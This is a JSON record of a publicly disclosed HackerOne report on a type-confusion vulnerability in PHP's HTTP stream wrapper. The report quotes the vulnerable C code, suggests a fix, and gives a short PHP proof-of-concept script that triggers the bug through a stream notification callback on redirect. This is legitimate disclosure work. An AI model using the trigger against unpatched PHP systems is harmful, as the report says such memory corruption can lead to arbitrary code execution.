{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "eveeez", 
        "spetr0x"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73247, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-04-14T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "php_stream_url_wrap_http_ex() type-confusion vulnerability", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:41:50.448Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:41:50.448Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "mongo", 
                "url": "/mongo"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496257, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "mongo", 
                "url": "/mongo"
            }, 
            "created_at": "2015-06-30T11:41:50.448Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:46.228Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196223, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "mongo", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/mongo", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/019/482/69ae8ec507576ad083c20cd5559a4f3bbd2e0255_small.png?1463395488"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-04-14T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73247", 
    "created_at": "2015-03-31T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a title=\"https://bugs.php.net/bug.php?id=69337\" href=\"/redirect?signature=6a459611bfad4fd4aac12778e75b032077852bbf&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69337\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=69337</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"description\">Description:</h2>\n\n<p>php_stream_url_wrap_http_ex() creates a $http_response_header array variable in the local execution scope (which may be the global scope).</p>\n\n<p>Then it gets a pointer to this variable, and throughout the function&#39;s execution accesses it multiple times, assuming that:<br>\n1) the variable still exists<br>\n1) the variable is indeed an array</p>\n\n<p>ext/standard/http_fopen_wrapper.c:</p>\n<pre class=\"highlight plaintext\"><code>    if (header_init) {\n            zval *ztmp;\n            MAKE_STD_ZVAL(ztmp);\n            array_init(ztmp);\n            ZEND_SET_SYMBOL(EG(active_symbol_table), &quot;http_response_header&quot;, ztmp);\n    }\n\n    {\n            zval **rh;\n            zend_hash_find(EG(active_symbol_table), &quot;http_response_header&quot;, sizeof(&quot;http_response_header&quot;), (void **) &amp;rh);\n            response_header = *rh;\n    }        \n\n    .....\n\n    ZVAL_STRINGL(http_response, tmp_line, tmp_line_len, 1);\n    zend_hash_next_index_insert(Z_ARRVAL_P(response_header), &amp;http_response, sizeof(zval *), NULL);\n</code></pre>\n<p>However, by using the stream notifications feature, an attacker can change the type of the $http_response_header variable before the function has finished executing, resulting in a type-confusion vulnerability, which has been shown several times in the past to lead to arbitrary code execution.</p>\n\n<p>There are numerous stream notification codes that can be used for this purpose:</p>\n\n<ul>\n<li>STREAM_NOTIFY_REDIRECTED</li>\n<li>STREAM_NOTIFY_AUTH_RESULT</li>\n<li>STREAM_NOTIFY_FAILURE</li>\n</ul>\n\n<p>And possibly others... The function should probably zval_add_ref() the $http_response_header as soon as its initialized, and then validate its type before every use, rather than assume its still an array.</p>\n\n<p>Tested against:</p>\n\n<ul>\n<li>64-bit PHP 5.5.9-1ubuntu4.7 (cli)</li>\n<li>32-bit PHP 5.5.9-1ubuntu4.7 (cli)</li>\n<li>32/64-bit PHP 5.6.7 (cli) (built: Mar 27 2015 07:04:21) (DEBUG)   - custom build with ./configure --enable-debug</li>\n</ul>\n\n<h2 id=\"test-script\">Test script:</h2>\n\n<p>&lt;?php<br>\n   function stream_notification_callback($notification_code, $severity, $message, $message_code, $bytes_transferred, $bytes_max)<br>\n   {<br>\n       if($notification_code == STREAM_NOTIFY_REDIRECTED)<br>\n       {<br>\n        // $http_response_header is now a string, but will be used as an array<br>\n        // by php_stream_url_wrap_http_ex() later on<br>\n        $GLOBALS[&#39;http_response_header&#39;] = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\0\\0\\0\\0&quot;;<br>\n       }<br>\n   }</p>\n\n<p>$ctx = stream_context_create();<br>\n   stream_context_set_params($ctx, array(&quot;notification&quot; =&gt; &quot;stream_notification_callback&quot;));</p>\n\n<p>file_get_contents(&quot;<a title=\"http://php.net/get-involved\" href=\"/redirect?signature=d9b3dfb011c645117b13c6eb58a9ba172fda5907&amp;url=http%3A%2F%2Fphp.net%2Fget-involved\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://php.net/get-involved</span><i class=\"icon-external-link\"></i></a>&quot;, false, $ctx); // any url that causes a http redirection<br>\n?&gt;</p>\n", 
    "vulnerability_information": "https://bugs.php.net/bug.php?id=69337\n\nDescription:\n------------\nphp_stream_url_wrap_http_ex() creates a $http_response_header array variable in the local execution scope (which may be the global scope).\n\nThen it gets a pointer to this variable, and throughout the function's execution accesses it multiple times, assuming that:\n1) the variable still exists\n1) the variable is indeed an array\n\next/standard/http_fopen_wrapper.c:\n\n        if (header_init) {\n                zval *ztmp;\n                MAKE_STD_ZVAL(ztmp);\n                array_init(ztmp);\n                ZEND_SET_SYMBOL(EG(active_symbol_table), \"http_response_header\", ztmp);\n        }\n\n        {\n                zval **rh;\n                zend_hash_find(EG(active_symbol_table), \"http_response_header\", sizeof(\"http_response_header\"), (void **) &rh);\n                response_header = *rh;\n        }        \n\n        .....\n        \n        ZVAL_STRINGL(http_response, tmp_line, tmp_line_len, 1);\n        zend_hash_next_index_insert(Z_ARRVAL_P(response_header), &http_response, sizeof(zval *), NULL);\n\n\nHowever, by using the stream notifications feature, an attacker can change the type of the $http_response_header variable before the function has finished executing, resulting in a type-confusion vulnerability, which has been shown several times in the past to lead to arbitrary code execution.\n\nThere are numerous stream notification codes that can be used for this purpose:\n- STREAM_NOTIFY_REDIRECTED\n- STREAM_NOTIFY_AUTH_RESULT\n- STREAM_NOTIFY_FAILURE\n\nAnd possibly others... The function should probably zval_add_ref() the $http_response_header as soon as its initialized, and then validate its type before every use, rather than assume its still an array.\n\nTested against:\n- 64-bit PHP 5.5.9-1ubuntu4.7 (cli)\n- 32-bit PHP 5.5.9-1ubuntu4.7 (cli)\n- 32/64-bit PHP 5.6.7 (cli) (built: Mar 27 2015 07:04:21) (DEBUG)   - custom build with ./configure --enable-debug\n\nTest script:\n---------------\n<?php\n   function stream_notification_callback($notification_code, $severity, $message, $message_code, $bytes_transferred, $bytes_max)\n   {\n       if($notification_code == STREAM_NOTIFY_REDIRECTED)\n       {\n        // $http_response_header is now a string, but will be used as an array\n        // by php_stream_url_wrap_http_ex() later on\n        $GLOBALS['http_response_header'] = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\0\\0\\0\\0\";\n       }\n   }\n\n   $ctx = stream_context_create();\n   stream_context_set_params($ctx, array(\"notification\" => \"stream_notification_callback\"));\n\n   file_get_contents(\"http://php.net/get-involved\", false, $ctx); // any url that causes a http redirection\n?>", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}